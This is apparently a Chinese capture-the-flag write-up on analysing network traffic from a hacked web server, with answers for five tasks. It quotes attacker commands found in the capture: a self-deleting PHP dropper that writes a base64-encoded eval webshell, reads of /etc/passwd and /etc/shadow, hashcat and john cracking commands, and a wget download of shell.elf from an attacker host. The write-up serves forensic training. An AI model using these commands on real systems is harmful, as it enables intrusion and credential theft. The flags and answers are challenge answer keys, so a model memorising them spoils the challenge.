| 题目名称 | 题目方向 | 题目难度 |
| --- | --- | --- |
| 被攻击的流量 | 安全防护 | \*\* |

A集团的WebServer服务器被黑客入侵，该服务器的Web应用系统被上传多个恶意文件，并且被攻击者修改了系统密码。幸运的是一台流量监控服务器捕捉到了黑客攻击的全部手法，您的团队需要帮助该公司分析黑客的攻击行为，找到修改后的系统密码，并对黑客攻击的漏洞进行修复和加固！

### 任务一

打开大部分http的GET请求，使用WireShark都可在流量中的user-agent字段可发现指纹纹: w13scan

![1686536274187](https://oss.edu.sangfor.com.cn/file/20240704/240704194050584duyl8.png)

Sangfor{w13scan}

### 任务二

快捷方法为根据info筛选出/index.php/index/ajax/upload这一路由的POST请求，即可发  
现写入webshell的流量

审计流量可得有一条流量分片传输文件：

```
&lt;?php system("echo `echo PD9waHAgQGV2YWwoJF9QT1NUW2tdKTs/Pg==|base64 - d`&gt;dbe6b48e012a24557469ab128a6409ac.php");@unlink ("midshell.php");?&gt;
```

可以观察出这是一个自删除的临时马，其中写入webshell的系统命令是：

```
echo `echo PD9waHAgQGV2YWwoJF9QT1NUW2tdKTs/Pg==|base64 - d`&gt;dbe6b48e012a24557469ab128a6409ac.php
```

![16865361419020](https://oss.edu.sangfor.com.cn/file/20240704/240704194050629ubzo1.png)

___

___

### 任务三

在流2464中

![17200845128027](https://oss.edu.sangfor.com.cn/file/20240704/240704194050447afy2m.png)

流量中可以发现攻击者执行了读/etc/passwd和/etc/shadow文件的命令，分别是:

```
cat /etc/passwd
echo "webuser123"|sudo -S cat /etc/shadow
```

使用john可对root密码进行爆破：

```
# hashcat爆破
hashcat --force -m 1800 -a 0 shadow.txt top1000.txt -o res.txt

# john爆破
unshadow passwd.txt shadow.txt &gt; rawdata.txt john rawdata.txt
```

可得root密码为abcd123

![17200845100677](https://oss.edu.sangfor.com.cn/file/20240704/2407041940504133bl7s.png)

### 任务四

在2470的包中，找到下载恶意文件命令

![1720092669829](https://oss.edu.sangfor.com.cn/file/20240704/240704194050494n06id.png)

wget http://192.168.186.132:8000/shell.elf

### 任务五

攻击者执行最后一次的Linux命令是( )。

cat /var/www/html/hello.txt

![1720093088110](https://oss.edu.sangfor.com.cn/file/20240704/240704194050502xxl94.png)